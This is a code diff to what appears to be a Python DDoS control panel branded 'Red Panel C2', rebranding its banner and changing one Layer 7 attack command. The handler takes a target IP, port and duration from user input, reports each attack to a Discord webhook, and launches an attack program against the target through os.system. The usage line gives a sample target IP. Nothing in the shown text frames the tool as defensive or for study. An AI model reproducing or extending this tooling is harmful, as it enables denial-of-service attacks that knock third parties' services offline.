@@ -135,7 +135,7 @@ def get_device_name():
 def menu(): 
      sys.stdout.write(f"         \x1b]2;Red Panel C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
      clear() 
-     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
+     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRed \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Red Panel C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Podi Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.2\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRed \x1b[38;2;0;255;255m]') 
      print("") 
      print(""" 
                         \x1b[38;2;0;212;14m╔═══╗\x1b[38;2;0;186;45m╔═══╗ \x1b[38;2;0;150;88m╔═══╗\x1b[38;2;0;113;133m╔═══╗\x1b[38;2;0;83;168m╔═══╗\x1b[38;2;0;49;147m╔═══╗
@@ -406,7 +406,7 @@ def main():
 
 # LAYER 7 METHODS
  
-        elif "ovh-beam" in cnc:
+        elif "tls-v1" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
@@ -414,9 +414,9 @@ def main():
                 time = cnc.split()[4] 
                 device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-BEAM\n---------------\nTarget: {ip}:{port}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
+                os.system(f'node {method} {ip} {port} {time} 1024')
             except IndexError:
-                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+                print('Usage: tls <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
     
         elif "https-spoof" in cnc:
